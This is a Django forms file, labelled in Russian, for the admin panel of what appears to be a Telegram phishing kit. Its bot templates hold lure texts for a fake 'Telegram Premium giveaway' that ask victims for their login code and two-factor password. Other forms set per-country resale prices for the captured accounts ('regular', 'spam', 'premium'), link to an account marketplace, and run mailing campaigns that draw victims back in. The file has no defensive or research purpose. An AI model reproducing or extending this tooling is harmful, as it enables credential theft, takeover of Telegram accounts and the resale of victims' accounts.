from django import forms
from .models import BotTemplate, BotInstance, MailingCampaign, SalesPlan, CountryPrice


class CountryPriceForm(forms.ModelForm):
    COUNTRIES = [
        ('RU', 'Россия'), ('US', 'США'), ('UA', 'Украина'), ('KZ', 'Казахстан'), ('BY', 'Беларусь'),
        ('DE', 'Германия'), ('FR', 'Франция'), ('GB', 'Великобритания'), ('IT', 'Италия'), ('ES', 'Испания'),
        ('PL', 'Польша'), ('NL', 'Нидерланды'), ('BE', 'Бельгия'), ('CZ', 'Чехия'), ('SE', 'Швеция'),
        ('TR', 'Турция'), ('IL', 'Израиль'), ('AE', 'ОАЭ'), ('SA', 'Саудовская Аравия'), ('IN', 'Индия'),
        ('CN', 'Китай'), ('JP', 'Япония'), ('KR', 'Южная Корея'), ('SG', 'Сингапур'), ('MY', 'Малайзия'),
        ('TH', 'Таиланд'), ('VN', 'Вьетнам'), ('ID', 'Индонезия'), ('PH', 'Филиппины'), ('BR', 'Бразилия'),
        ('AR', 'Аргентина'), ('MX', 'Мексика'), ('CO', 'Колумбиia'), ('PE', 'Перу'), ('CL', 'Чили'),
        ('EG', 'Египет'), ('ZA', 'ЮАР'), ('NG', 'Нигерия'), ('KE', 'Кения'), ('AU', 'Австралия'),
        ('NZ', 'Новая Зеландия'), ('CA', 'Канада'), ('CH', 'Швейцария'), ('AT', 'Австрия'), ('DK', 'Дания')
    ]

    country = forms.ChoiceField(
        choices=[('', 'Выберите страну')] + COUNTRIES,
        widget=forms.Select(attrs={'class': 'form-control country-select'})
    )

    class Meta:
        model = CountryPrice
        fields = [
            'country', 'account_type',
            'price_regular', 'not_for_sale_regular',
            'price_spam', 'not_for_sale_spam',
            'price_premium', 'not_for_sale_premium'
        ]
        widgets = {
            'account_type': forms.HiddenInput(attrs={'value': 'regular'}),
            'price_regular': forms.NumberInput(
                attrs={'class': 'form-control price-regular', 'step': '0.01', 'placeholder': '0.00'}),
            'not_for_sale_regular': forms.CheckboxInput(attrs={'class': 'form-check-input not-for-sale-regular'}),
            'price_spam': forms.NumberInput(
                attrs={'class': 'form-control price-spam', 'step': '0.01', 'placeholder': '0.00'}),
            'not_for_sale_spam': forms.CheckboxInput(attrs={'class': 'form-check-input not-for-sale-spam'}),
            'price_premium': forms.NumberInput(
                attrs={'class': 'form-control price-premium', 'step': '0.01', 'placeholder': '0.00'}),
            'not_for_sale_premium': forms.CheckboxInput(attrs={'class': 'form-check-input not-for-sale-premium'}),
        }


CountryPriceFormSet = forms.inlineformset_factory(
    SalesPlan,
    CountryPrice,
    form=CountryPriceForm,
    extra=1,
    can_delete=True
)


class SalesPlanForm(forms.ModelForm):
    COUNTRIES = CountryPriceForm.COUNTRIES

    class Meta:
        model = SalesPlan
        fields = ['name', 'product_name', 'product_description', 'buyer_info']
        widgets = {
            'name': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Название плана продаж'}),
            'product_name': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Название товара'}),
            'product_description': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': 'Описание товара'}),
            'buyer_info': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': 'Информация для покупателя'}),
        }


class BotTemplateForm(forms.ModelForm):
    class Meta:
        model = BotTemplate
        fields = [
            'name',
            'welcome_photo', 'welcome_message', 'login_button_text',
            'sending_code_message',
            'code_sent_message', 'view_code_button_text', 'view_code_button_url',
            'checking_code_message', 'code_invalid_message',
            'password_request_message', 'checking_password_message', 'password_invalid_message',
            'success_photo', 'success_message',
            'error_message', 'timeout_message', 'timeout_button_text',
            'unknown_command_message',
            'support_text', 'support_chat_url', 'panel_chat_text', 'panel_chat_url',
            'lolzteam_text', 'lolzteam_url',
            'requires_subscription', 'subscription_channel', 'sponsor_url', 'sponsor_text',
        ]
        widgets = {
            'name': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Название шаблона бота'}),
            'welcome_message': forms.Textarea(attrs={'class': 'form-control', 'rows': 5,
                                                     'placeholder': '👋 <b>Приветствую, {name}</b>\n\n🎁 Telegram устроил розыгрыш Telegram Premium...'}),
            'login_button_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': '📱 Войти'}),
            'sending_code_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 2, 'placeholder': '⏳ <i>Отправляем код...</i>'}),
            'code_sent_message': forms.Textarea(attrs={'class': 'form-control', 'rows': 3,
                                                       'placeholder': '💭 <b>Мы отправили вам код подтверждения</b>'}),
            'view_code_button_text': forms.TextInput(
                attrs={'class': 'form-control', 'placeholder': '👀 Посмотреть код'}),
            'view_code_button_url': forms.URLInput(
                attrs={'class': 'form-control', 'placeholder': 'tg://resolve?phone=++42777'}),
            'checking_code_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 2, 'placeholder': '🕒 <i>Проверяем...</i>'}),
            'code_invalid_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 4, 'placeholder': '❌ <b>Код неверный!</b>'}),
            'password_request_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 2, 'placeholder': '🔑 <b>Введите пароль</b>'}),
            'checking_password_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 2, 'placeholder': '🕒 <i>Проверяем...</i>'}),
            'password_invalid_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': '❌ <b>Пароль неверный!</b>'}),
            'success_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 4, 'placeholder': '✅ <b>Успешно!</b>'}),
            'error_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': '❌ Произошла ошибка'}),
            'timeout_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': '⏰❌ <b>Истекло время ожидания</b>'}),
            'timeout_button_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': '📱 Войти'}),
            'unknown_command_message': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 2, 'placeholder': '🤔 Неизвестная команда'}),
            'support_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Поддержка'}),
            'support_chat_url': forms.URLInput(attrs={'class': 'form-control', 'placeholder': 'https://t.me/...'}),
            'panel_chat_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Чат панели'}),
            'panel_chat_url': forms.URLInput(attrs={'class': 'form-control', 'placeholder': 'https://t.me/...'}),
            'lolzteam_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'LolzTeam'}),
            'lolzteam_url': forms.URLInput(attrs={'class': 'form-control', 'placeholder': 'https://lolz.guru/...'}),
            'subscription_channel': forms.TextInput(attrs={'class': 'form-control', 'placeholder': '@channel_name'}),
            'sponsor_url': forms.URLInput(attrs={'class': 'form-control', 'placeholder': 'https://...'}),
            'sponsor_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Спонсор'}),
        }
        labels = {
            'welcome_photo': 'Фотография (необязательно)',
            'success_photo': 'Фотография (необязательно)',
        }


class BotInstanceForm(forms.ModelForm):
    AUTH_CHOICES = [
        ('classic', 'Классическая'),
        ('web', 'Web (BETA)'),
    ]

    auth_method = forms.ChoiceField(
        choices=AUTH_CHOICES,
        widget=forms.RadioSelect(),
        initial='classic',
        label="Авторизация"
    )

    class Meta:
        model = BotInstance
        fields = [
            'name', 'template', 'sales_plan', 'token', 'bot_type',
            'channel', 'key', 'auth_method', 'webapp_url',
            'webapp_button_text', 'message_timeout',
            'max_login_attempts', 'session_timeout', 'ip_whitelist',
            'notify_on_success', 'notify_on_error', 'admin_chat_id',
            'max_concurrent_sessions', 'request_delay', 'enable_donations',
            'donation_url', 'enable_ads', 'ads_interval', 'enable_analytics',
            'enable_backups', 'backup_interval', 'description', 'tags'
        ]
        widgets = {
            'name': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Название бота'}),
            'template': forms.Select(attrs={'class': 'form-control'}),
            'sales_plan': forms.Select(attrs={'class': 'form-control'}),
            'token': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Токен бота от @BotFather'}),
            'bot_type': forms.Select(attrs={'class': 'form-control'}),
            'channel': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Канал (необязательно)'}),
            'key': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Ключ (необязательно)'}),
            'webapp_url': forms.URLInput(
                attrs={'class': 'form-control', 'placeholder': 'https://yourdomain.com/webapp/'}),
            'webapp_button_text': forms.TextInput(attrs={'class': 'form-control', 'placeholder': '🔐 Авторизоваться'}),
            'message_timeout': forms.NumberInput(attrs={'class': 'form-control'}),
            'max_login_attempts': forms.NumberInput(attrs={'class': 'form-control'}),
            'session_timeout': forms.NumberInput(attrs={'class': 'form-control'}),
            'ip_whitelist': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': '192.168.1.1\n10.0.0.1'}),
            'admin_chat_id': forms.TextInput(attrs={'class': 'form-control', 'placeholder': '123456789'}),
            'max_concurrent_sessions': forms.NumberInput(attrs={'class': 'form-control'}),
            'request_delay': forms.NumberInput(attrs={'class': 'form-control'}),
            'donation_url': forms.URLInput(attrs={'class': 'form-control', 'placeholder': 'https://...'}),
            'ads_interval': forms.NumberInput(attrs={'class': 'form-control'}),
            'backup_interval': forms.NumberInput(attrs={'class': 'form-control'}),
            'description': forms.Textarea(
                attrs={'class': 'form-control', 'rows': 3, 'placeholder': 'Описание бота...'}),
            'tags': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'auth, premium, spam'}),
            'notify_on_success': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
            'notify_on_error': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
            'enable_donations': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
            'enable_ads': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
            'enable_analytics': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
            'enable_backups': forms.CheckboxInput(attrs={'class': 'form-check-input'}),
        }
        labels = {
            'name': 'Название бота',
            'template': 'Шаблон бота',
            'sales_plan': 'План продаж',
            'token': 'Токен бота',
            'bot_type': 'Тип бота',
            'webapp_url': 'Web App URL',
            'webapp_button_text': 'Текст кнопки Web App',
        }

    def __init__(self, *args, **kwargs):
        self.user = kwargs.pop('user', None)
        super().__init__(*args, **kwargs)

        if self.user:
            self.fields['template'].queryset = BotTemplate.objects.filter(owner=self.user)
            self.fields['sales_plan'].queryset = SalesPlan.objects.filter(owner=self.user)
        else:
            self.fields['template'].queryset = BotTemplate.objects.none()
            self.fields['sales_plan'].queryset = SalesPlan.objects.none()

        self.fields['inline_keyboard'] = forms.BooleanField(
            initial=True,
            required=False,
            widget=forms.HiddenInput()
        )
        self.fields['anti_steal'] = forms.BooleanField(
            initial=True,
            required=False,
            widget=forms.HiddenInput()
        )
        self.fields['send_code_without_number'] = forms.BooleanField(
            initial=True,
            required=False,
            widget=forms.HiddenInput()
        )
        self.fields['auto_delete_messages'] = forms.BooleanField(
            initial=True,
            required=False,
            widget=forms.HiddenInput()
        )

    def clean_token(self):
        token = self.cleaned_data.get('token')
        if not token:
            raise forms.ValidationError("Токен бота обязателен для заполнения")
        return token

    def clean_template(self):
        template = self.cleaned_data.get('template')
        if not template:
            raise forms.ValidationError("Выберите шаблон для бота")
        return template

    def clean_sales_plan(self):
        sales_plan = self.cleaned_data.get('sales_plan')
        if not sales_plan:
            raise forms.ValidationError("Выберите план продаж для бота")
        return sales_plan


class MailingCampaignForm(forms.ModelForm):
    class Meta:
        model = MailingCampaign
        fields = ['name', 'message_text', 'send_to_all', 'bots']
        widgets = {
            'name': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Название рассылки'}),
            'message_text': forms.Textarea(attrs={'class': 'form-control', 'rows': 4,
                                                  'placeholder': '👋 <b>Привет</b>\n👇 Попробуйте получить доступ снова'}),
            'bots': forms.SelectMultiple(attrs={'class': 'form-control'}),
        }